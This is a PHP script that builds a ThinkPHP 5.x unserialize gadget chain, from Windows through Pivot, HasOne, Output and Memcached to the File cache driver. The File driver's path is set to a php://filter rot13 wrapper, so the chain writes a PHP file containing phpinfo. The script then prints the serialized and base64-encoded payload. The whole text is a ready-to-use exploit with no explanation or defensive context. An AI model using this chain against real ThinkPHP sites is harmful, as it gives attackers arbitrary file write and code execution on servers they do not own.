<?php
//File类
namespace think\cache\driver;
class File
{
    protected $tag='ssssss';
    protected $options = [
        'expire'        => 0,
        'cache_subdir'  => false,
        'prefix'        => false,
        'path'          => 'php://filter/write=string.rot13/resource=./<?cuc cucvasb();?>',
        'data_compress' => false,
    ];
}

//Memcached类
namespace think\session\driver;
use think\cache\driver\File;
class Memcached
{
    protected $handler;
    function __construct()
    {
        $this->handler=new File();
    }
}

//Output类
namespace think\console;
use think\session\driver\Memcached;
class Output
{
    protected $styles = ['removeWhereField'];
    function __construct()
    {
        $this->handle=new Memcached();
    }
}
//HasOne类
namespace think\model\relation;
use think\console\Output;
class HasOne
{
    function __construct()
    {
        $this->query=new Output();
    }
}

//Pivot类
namespace think\model;
use think\model\relation\HasOne;
class Pivot
{
    protected $append = ['getError'];
    public function __construct()
    {
        $this->error=new HasOne();
    }
}
//Windows类
namespace think\process\pipes;
use think\model\Pivot;
class Windows
{
    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
$x=new Windows();
echo serialize($x);
echo "<p>";
echo base64_encode(serialize($x));
